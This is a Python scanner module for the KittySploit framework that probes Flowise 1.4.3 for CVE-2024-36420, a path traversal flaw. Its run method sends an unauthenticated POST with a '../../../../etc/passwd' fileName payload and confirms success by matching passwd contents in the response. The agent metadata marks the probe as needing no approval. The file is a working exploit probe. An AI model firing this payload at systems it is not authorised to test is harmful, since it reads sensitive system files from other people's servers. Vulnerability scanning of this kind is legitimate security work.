#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Flowise 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Flowise 1.4.3 - Arbitrary File Read Detection',
        'description': "Flowise 1.4.3 contains a path traversal caused by lack of sanitization of 'fileName' parameter in /api/v1/openai-assistants-file endpoint in index.ts, letting attackers read arbitrary files, exploit requires attacker to send crafted request.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'flowise', 'lfi', 'unauth', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-36420',
            'https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise/',
            'https://github.com/FlowiseAI/Flowise/blob/e93ce07851cdc0fcde12374f301b8070f2043687/packages/server/src/index.ts#L982',
        ],
        'cve': 'CVE-2024-36420',
    }

    def run(self):
        path = '/api/v1/openai-assistants-file'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"fileName":"../../../../etc/passwd"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('attachment; filename=passwd',)
        body_regexes = ('(?m)^root:[^:]*:0:0:', '(?m)^daemon:[^:]*:[0-9]+:[0-9]+:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Flowise 1.4.3 - Arbitrary File Read detected', path=path)
            return True
        return False

